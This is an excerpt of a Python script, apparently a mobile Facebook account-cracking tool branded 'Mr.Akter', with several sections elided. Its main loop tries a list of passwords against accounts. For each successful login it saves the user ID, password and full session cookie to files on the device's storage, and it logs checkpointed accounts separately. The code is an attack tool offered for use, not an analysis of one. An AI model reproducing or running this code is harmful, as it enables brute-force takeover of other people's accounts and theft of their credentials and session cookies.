...
time.sleep(1.5)
os.system(f'xdg-open https://www.facebook.com/mdakterhosain770?mibextid=ZbWKwL')
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.Akter
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.Akter
...
def Main():
	...
	if opt in ["A","1","01", "a"]:
		virusA()
	if opt in ["B","b","2","02"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61551413003716&mibextid=ZbWKwL');time.sleep(1)
	if opt in ["0","0"]:
		exit()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[65:80]
                print('\033[38;5;46m[Akter-OK] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
      #          cek_apk(session,coki)                
                open('/sdcard/Akter-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
                open('/sdcard/Akter-OK.txt', 'a').write( uid+'|'+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
        #        print('\033[38;5;46m[Akter-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/Akter-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
